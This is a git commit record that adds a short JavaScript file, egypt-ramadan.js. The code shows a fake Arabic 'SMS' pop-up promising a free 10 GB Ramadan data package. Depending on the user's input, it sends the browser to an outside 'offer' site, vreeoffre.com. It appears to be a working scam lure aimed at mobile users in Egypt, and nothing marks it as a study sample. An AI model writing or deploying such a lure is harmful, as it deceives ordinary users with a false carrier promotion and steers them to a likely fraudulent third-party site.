79e5dc55e02283f7a9ecbb39bd2a4a85d97b6436
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-02-28 08:51:27 +0100

    Create egypt-ramadan.js

---
+++ egypt-ramadan.js
@@ -0,0 +1,5 @@
+var password = 'رمضان سعيد'
+password=prompt('SMS: تهانينا، باقة بيانات رمضان المجانية 10 جيجابايت قيد الانتظار... انقر على "موافق" للتفعيل الآن','رمضان سعيد');
+if (password != 'رمضان سعيد') {
+location.href='https://vreeoffre.com/ramadan-egypt';
+}
